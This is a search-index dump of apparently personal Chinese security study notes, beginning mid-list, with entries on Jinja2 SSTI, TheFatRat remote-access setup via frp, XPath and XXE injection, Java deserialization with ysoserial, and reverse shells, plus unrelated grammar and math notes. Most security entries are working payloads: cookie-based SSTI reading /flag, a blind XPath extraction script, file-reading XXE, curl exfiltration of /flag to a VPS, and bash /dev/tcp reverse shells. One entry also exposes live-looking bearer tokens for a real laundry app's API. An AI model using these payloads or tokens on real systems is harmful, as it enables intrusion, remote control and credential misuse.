\u0026#39;_blake2.blake2s\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tempfile._RandomNameSequence\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tempfile._TemporaryFileCloser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tempfile._TemporaryFileWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tempfile.SpooledTemporaryFile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;tempfile.TemporaryDirectory\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.Request\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.OpenerDirector\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.BaseHandler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.HTTPPasswordMgr\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.AbstractBasicAuthHandler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.AbstractDigestAuthHandler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.URLopener\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;urllib.request.ftpwrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;http.cookiejar.Cookie\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;http.cookiejar.CookiePolicy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;http.cookiejar.Absent\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;http.cookiejar.CookieJar\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableListMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableDictMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures._omd_bucket\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.Headers\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.ImmutableHeadersMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.IfRange\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.Range\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.ContentRange\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.datastructures.FileStorage\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses._MISSING_TYPE\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses._KW_ONLY_TYPE\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses._FIELD_BASE\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses.InitVar\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses.Field\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;dataclasses._DataclassParams\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.sansio.multipart.Event\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.sansio.multipart.MultipartDecoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.sansio.multipart.MultipartEncoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;importlib._abc.Loader\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pkgutil.ImpImporter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pkgutil.ImpLoader\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;unicodedata.UCD\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;hmac.HMAC\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wsgi.ClosingIterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wsgi.FileWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wsgi._RangeWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.utils.HTMLBuilder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.accept.AcceptMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.auth.AuthorizationMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.auth.WWWAuthenticateMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_json.Scanner\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_json.Encoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;json.decoder.JSONDecoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;json.encoder.JSONEncoder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.formparser.FormDataParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.formparser.MultiPartParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.user_agent.UserAgent\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.useragents._UserAgentParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.sansio.request.Request\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.request.StreamOnlyMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.sansio.response.Response\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.response.ResponseStream\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.response.ResponseStreamMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.etag.ETagRequestMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.etag.ETagResponseMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.wrappers.user_agent.UserAgentMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.test._TestCookieHeaders\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.test._TestCookieResponse\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.test.EnvironBuilder\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.test.Client\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;decimal.Decimal\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;decimal.Context\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;decimal.SignalDictMixin\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;decimal.ContextManager\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;numbers.Number\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;uuid.UUID\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_pickle.Pdata\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_pickle.PicklerMemoProxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_pickle.UnpicklerMemoProxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_pickle.Pickler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;_pickle.Unpickler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pickle._Framer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pickle._Unframer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pickle._Pickler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pickle._Unpickler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.bccache.Bucket\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.bccache.BytecodeCache\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.utils.MissingType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.utils.LRUCache\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.utils.Cycler\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.utils.Joiner\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.utils.Namespace\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.nodes.EvalContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.nodes.Node\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.visitor.NodeVisitor\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.idtracking.Symbols\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.compiler.MacroRef\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.compiler.Frame\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.TemplateReference\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.Context\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.BlockReference\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.LoopContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.Macro\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.runtime.Undefined\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.lexer.Failure\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.lexer.TokenStreamIterator\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.lexer.TokenStream\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.lexer.Lexer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.parser.Parser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.environment.Environment\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.environment.Template\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.environment.TemplateModule\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.environment.TemplateExpression\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.environment.TemplateStream\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;jinja2.loaders.BaseLoader\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.local.Local\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.local.LocalStack\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.local.LocalManager\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.local._ProxyLookup\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.local.LocalProxy\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;difflib.SequenceMatcher\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;difflib.Differ\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;difflib.HtmlDiff\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pprint._safe_key\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;pprint.PrettyPrinter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.routing.RuleFactory\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.routing.RuleTemplate\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.routing.BaseConverter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.routing.Map\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;werkzeug.routing.MapAdapter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;gettext.NullTranslations\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click._compat._FixupStream\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click._compat._AtomicFile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.utils.LazyFile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.utils.KeepOpenFile\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.utils.PacifyFlushWrapper\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.types.ParamType\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.parser.Option\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.parser.Argument\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.parser.ParsingState\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.parser.OptionParser\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.formatting.HelpFormatter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.core.Context\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.core.BaseCommand\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;click.core.Parameter\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.signals.Namespace\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.signals._FakeSignal\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.cli.DispatchingApp\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.cli.ScriptInfo\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.config.ConfigAttribute\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.ctx._AppCtxGlobals\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.ctx.AppContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.ctx.RequestContext\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.scaffold.Scaffold\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itsdangerous._json._CompactJSON\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itsdangerous.signer.SigningAlgorithm\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itsdangerous.signer.Signer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;itsdangerous.serializer.Serializer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.json.tag.JSONTag\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.json.tag.TaggedJSONSerializer\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.sessions.SessionInterface\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;flask.blueprints.BlueprintSetupState\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;__future__._Feature\u0026#39;\u0026gt;]\u0026#34; l=a[1:][:-1].split(\u0026#39;,\u0026#39;) print(l[218]) for j,i in enumerate(l): m,n=i.index(\u0026#34;\u0026#39;\u0026#34;),i.rindex(\u0026#34;\u0026#39;\u0026#34;) if \u0026#39;Printer\u0026#39; in i[m:][:n]: print(j,i) 不清楚过滤可用request.cookies.a\nurl: {{()[request.cookies.c][request.cookies.b][request.cookies.s]()[59][request.cookies.i][request.cookies.g][request.cookies.u][request.cookies.m](request.cookies.o)[request.cookies.e](request.cookies.f).read()}} cookie=cookie: c=__class__;b=__base__;s=__subclasses__;i=__init__;g=__globals__;p=open;u=__builtins__;m=__import__;f=cat /flag;o=os;e=popen "},{"id":43,"href":"/docs/hack/thefatrat/","title":"TheFatRat","section":"hack","content":"某日突发奇想\n在github 上发现了一个好东西。\n安装一哈\n配置VPS frp\r#\r[common] bind_port = 7000 # VPS监听端口（你可以改成其他端口） 攻击机\r#\r注意，记得开启vps上的6000端口和4444端口\n[common] server_addr = \u0026lt;VPS的IP地址\u0026gt; server_port = 7000 # VPS上frps的监听端口 [attack_machine_reverse_proxy] type = tcp local_ip = 127.0.0.1 local_port = 4444 # 攻击机上监听的端口（用来接收来自目标的连接） remote_port = 6000 # VPS上开放的远程端口，用来转发流量 生成payload\r#\r这个不多说\n注意在填写host的时候些vps地址，port 填remote_port的值(也就是6000端口)\n被攻击机器上线\n"},{"id":44,"href":"/docs/re/new/u%E5%87%80/","title":"u净","section":"demo","content":"u净 设备 access 空闲\nimport requests headers = { \u0026#39;Host\u0026#39;: \u0026#39;phoenix.ujing.online\u0026#39;, \u0026#39;authorization\u0026#39;: \u0026#39;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBVc2VySWQiOjI2ODQwMzU0LCJleHAiOjE3MTg2ODUyNTQsImlhdCI6MTcxMDY1MDA1NCwiaWQiOjM3MzI3Mzg3LCJuYW1lIjoiMTc2Mjg4MTgwMDcifQ.913YgdVAXa2CpPTy0ZDe4uSU2_rmWae-V9eSDKcjrhk\u0026#39;, \u0026#39;x-mobile-brand\u0026#39;: \u0026#39;Xiaomi\u0026#39;, \u0026#39;x-app-code\u0026#39;: \u0026#39;BA\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json; application/json\u0026#39;, \u0026#39;weex-version\u0026#39;: \u0026#39;1.1.39\u0026#39;, \u0026#39;x-app-version\u0026#39;: \u0026#39;2.4.7\u0026#39;, \u0026#39;x-mobile-model\u0026#39;: \u0026#39;MI CC 9e\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/4.3.1\u0026#39;, } params = { \u0026#39;lat\u0026#39;: \u0026#39;31.781257\u0026#39;, \u0026#39;lont\u0026#39;: \u0026#39;104.722751\u0026#39;, \u0026#39;page\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;size\u0026#39;: \u0026#39;10\u0026#39;, \u0026#39;scope\u0026#39;: \u0026#39;2000\u0026#39;, \u0026#39;mode\u0026#39;: \u0026#39;BA\u0026#39;, } response = requests.get(\u0026#39;https://phoenix.ujing.online/api/v1/stores/near\u0026#39;, params=params, headers=headers) print(response.text) import requests headers = { \u0026#39;Host\u0026#39;: \u0026#39;phoenix.ujing.online\u0026#39;, \u0026#39;authorization\u0026#39;: \u0026#39;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBVc2VySWQiOjI2ODQwMzU0LCJleHAiOjE3MTg2OTM4NDYsImlhdCI6MTcxMDY1ODY0NiwiaWQiOjM3MzI3Mzg3LCJuYW1lIjoiMTc2Mjg4MTgwMDcifQ.O57d8RDSIPiPMjujCOJy_kDk4pP4JPb6kOcNPyZfKBk\u0026#39;, \u0026#39;x-mobile-brand\u0026#39;: \u0026#39;Xiaomi\u0026#39;, \u0026#39;x-app-code\u0026#39;: \u0026#39;QA\u0026#39;, \u0026#39;weex-version\u0026#39;: \u0026#39;1.0.14\u0026#39;, \u0026#39;x-app-version\u0026#39;: \u0026#39;2.4.7\u0026#39;, \u0026#39;x-mobile-model\u0026#39;: \u0026#39;MI CC 9e\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json; charset=utf-8\u0026#39;, # \u0026#39;content-length\u0026#39;: \u0026#39;39\u0026#39;, # \u0026#39;accept-encoding\u0026#39;: \u0026#39;gzip\u0026#39;, # \u0026#39;cookie\u0026#39;: \u0026#39;acw_tc=46584e69e6704d70326faa561c30589410c3faf879df2677554cfe0275ad3f64; acw_tc=b5d1fb8f9754db56830caa042106f70756ae7df3f15ad4b08dba5a1747dde946; acw_tc=dd343230f10c3b47c0647be29166f50f265a0ab12e193611382832f9d47a65d8\u0026#39;, \u0026#39;user-agent\u0026#39;: \u0026#39;okhttp/4.3.1\u0026#39;, } data = {\u0026#39;washer\u0026#39;:[\u0026#39;62b409a508d91213947e6cc1\u0026#39;]} response = requests.post( \u0026#39;https://phoenix.ujing.online/api/v1/app/commonality/store/getCommonUsedStoreDetail\u0026#39;, headers=headers, json=data, ) print(response.text) "},{"id":45,"href":"/docs/network-security/java/web-inf%E8%AF%BB%E5%8F%96/","title":"WEB-INF 读取","section":"java","content":"WEB-INF读取\nfilename=help.docx 一般来说，出于安全的考虑我们会将网页放在WEB-INF文件下，防止页面直接被访问；\n这里主要说明，如何通过设置web.xml文件，来访问WEB-INF文件下的网页，\nfilename=WEB-INF/web.xml filename=WEB-INF/classes/struts.xml WEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 观察其中泄露信息，读取字节码（.class）,在反编译\nfilename=WEB-INF/classes/com/wm/ctf/FlagController.class "},{"id":46,"href":"/docs/network-security/other/xpath%E6%B3%A8%E5%85%A5/","title":"xpath 注入","section":"other","content":"详见\nXPATH注入学习 - 先知社区 (aliyun.com)\nimport requests import re import time s = requests.session() url =\u0026#39;http://400f158d-53cf-4163-82a9-0d5ca129fab9.node4.buuoj.cn:81/login.php\u0026#39; head ={ \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/xml\u0026#34; } find =re.compile(\u0026#39;\u0026lt;input type=\u0026#34;hidden\u0026#34; id=\u0026#34;token\u0026#34; value=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) strs =\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#39; flag =\u0026#39;\u0026#39; for i in range(1,100): for j in strs: time.sleep(0.2) r = s.post(url=url) token = find.findall(r.text) #猜测根节点名称 payload_1 = \u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(name(/*[1]), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) #猜测子节点名称 payload_2 = \u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(name(/root/*[1]), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) #猜测accounts的节点 payload_3 =\u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(name(/root/accounts/*[1]), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) #猜测user节点 payload_4 =\u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(name(/root/accounts/user/*[2]), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) #跑用户名和密码 payload_username =\u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(/root/accounts/user[2]/username/text(), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) payload_password =\u0026#34;\u0026lt;username\u0026gt;\u0026#39;or substring(/root/accounts/user[2]/password/text(), {}, 1)=\u0026#39;{}\u0026#39; or \u0026#39;\u0026#39;=\u0026#39;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;3123\u0026lt;/password\u0026gt;\u0026lt;token\u0026gt;{}\u0026lt;/token\u0026gt;\u0026#34;.format(i,j,token[0]) print(payload_username) r = s.post(url=url,headers=head,data=payload_password) print(r.text) if \u0026#34;非法操作\u0026#34; in r.text: flag+=j print(flag) break if \u0026#34;用户名或密码错误!\u0026#34; in r.text: break print(flag) "},{"id":47,"href":"/docs/network-security/other/xxe/","title":"XXE","section":"other","content":"XXE(XML External Entity attack)XML外部实体注入攻击\n\u0026lt;?xml version=\u0026#39;1.0\u0026#39;?\u0026gt; \u0026lt;!DOCTYPE x [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt; \u0026lt;username\u0026gt; admin//或者\u0026amp;xxe; \u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;123\u0026lt;/password\u0026gt; \u0026lt;/root\u0026gt; \u0026amp;xxe;会输出文件中的内容\n在上传xml文件时，utf8不行可以用utf16\niconv -f utf8 -t utf-16 1.xml\u0026gt;2.xml svg中的xxe\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///proc/self/cwd/flag.txt\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg height=\u0026#34;100\u0026#34; width=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;20\u0026#34;\u0026gt;\u0026amp;file;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; svg中也可以写js，xss\n"},{"id":48,"href":"/docs/learm/english/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6/","title":"一般现在时","section":"english","content":"\r定义\r#\r表示经常性或习惯性的动作或存在的状态。 表示客观事实或普遍真理。 构成\r#\r主语+do/does+其他 主语+be（am, is, are) +其他 客观事实\r#\rLight travels more quickly than sound.\n（光传播的速度比声音快。）\nHis father is a businessman.\n（他的父亲是一位商人。）\n习惯\r#\rShe often drinks coffee.\n（她常喝咖啡。）\nI get up at six every morning.\n（我每天早晨六点钟起床。）\n"},{"id":49,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/","title":"信息安全","section":"class notes","content":"\r第一节课\r#\rarp 欺骗\n伪造ip地址和mac 地址的对应关系 错误的mac 地址或错误的对应关系 "},{"id":50,"href":"/docs/learm/math/%E5%85%AC%E5%BC%8F%E6%B5%8B%E8%AF%95/","title":"公式测试","section":"math","content":"$$ {x|x=2n,-2\u0026lt;n\u0026lt;6,n\\neq0} $$\n"},{"id":51,"href":"/docs/network-security/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"反序列化","section":"java","content":"分析序列化后的字符串\n例子\nBearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu 作为序列化的标志参考:\n一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。\n或者如果以aced开头，那么他就是这一段Java序列化的16进制。\njava Deserialization Scanner\r#\r这个工具在burp插件里面有，去下载一下，记得初始化插件\n选中发送到插件里（选中右键-\u0026gt;拓展-\u0026gt;Deserialization-\u0026gt;Send request to DS Manual testing）\n在Manual Tetsing中用§包裹住字串，不要包裹Brerer\n下面选择Encode useing Base64，add添加，再选择Encode useing Base64，Attack\n等待一会，会有提示需要1-3minutes\nROME\n之后用ysoserial 里的MORE\nGitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \u0026#34;curl http://vps:10189 -d @/flag\u0026#34; \u0026gt; a.bin base64编码\nimport base64 with open(\u0026#39;a.bin\u0026#39;,\u0026#39;rb\u0026#39;)as f: b=f.read() print(base64.b64encdoe(b)) 放到会执行反序列化的地方取请求,触发命令执行\n也可以直接shell\nbash -i \u0026gt;\u0026amp; /dev/tcp/111.111.111.111/7015 0\u0026gt;\u0026amp;1 进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; \u0026gt; a.bin 同上base64编码，记得在前面带上Beaere\n请求之前记得监听端口\nnc -lvp 1234 "},{"id":52,"href":"/docs/network-security/other/%E5%8F%8D%E5%BC%B9shll/","title":"反弹shell","section":"other","content":"\r正向链接\r#\r攻击者连接目标机器，如远程桌面，web服务，ssh等\n反向连接\r#\r相当于角色反转，让目标机器来找我们，为什么要这样做呢\n常见于命令不回显，受限于防火墙等\n反弹shell,让目标机器来找我们，就得要有一个公网ip\n我们用ngrok.cc送的，可以免费用一个公网端口\n./sunny clientid 204616381952 free.idcfengye.com:10189 本地映射1234d端口，监听\nnc -lvp 1234 常见的方式\r#\rbash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1 or bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1\u0026#34;#更稳定 or echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.112/1234 0\u0026gt;\u0026amp;1\u0026#34; | bash or bash -i 